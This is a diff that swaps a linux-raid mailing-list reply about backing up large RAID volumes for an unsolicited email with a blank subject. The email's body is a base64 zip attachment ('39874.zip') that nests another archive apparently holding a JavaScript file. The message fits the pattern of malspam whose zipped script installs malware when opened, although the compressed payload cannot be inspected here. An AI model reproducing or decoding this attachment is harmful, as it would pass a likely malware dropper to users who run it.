@@ -1,33 +1,64 @@
-From: Reindl Harald <h.reindl@thelounge.net>
-Subject: Re: How to backup of large md raid volumes?
-Date: Sat, 20 May 2017 20:14:16 +0200
-Message-ID: <7349ab95-a06b-36af-6a27-159b63bd0a5d@thelounge.net>
-References: <442a4af0-00d2-853d-5294-84ae0353262b@gmail.com>
- <28a4540b-c5ac-bd8d-c030-6d718a02fdfc@thelounge.net>
- <59208443.7080404@youngman.org.uk>
+From: <citydesk@thereporteronline.com>
+Subject: (unknown)
+Date: Sat, 20 May 2017 20:00:58 -0000
+Message-ID: <149531045827.31457.9539551652725883002@chtts.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="39874.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <59208443.7080404@youngman.org.uk>
-Content-Language: de-CH
+Content-Disposition: attachment
+Subject: 
 Sender: linux-raid-owner@vger.kernel.org
-To: Wols Lists <antlists@youngman.org.uk>, Ram Ramesh <rramesh2400@gmail.com>, Linux Raid <linux-raid@vger.kernel.org>
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-
-
-Am 20.05.2017 um 20:00 schrieb Wols Lists:
-> I'd be inclined to try and get an e-SATA or USB-3 dock, and just back up
-> on to independent 8TB drives. Mind you, at £70 for a 3TB Barracuda, $500
-> for 16TB of disk doesn't sound pricey at all ...
-
-yes but it don't make much fun if you need to spread your backups to 
-several disks when you can have just one with all
-
-> One thing to watch out for, it sounds like the OP has mostly music and
-> videos, so compression is likely to INCREASE the disk space required...
-
-yo are confusing "compress-force=zlib" with "compress=zlib" - read the 
-BTRFS manuals, it's practically the same as comp-lzo for openvpn - 
-uncompressable data are not compressed
+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
+op/d0dIBUEsFBgAAAAABAAEAWwAAAJQKAAAAAA==
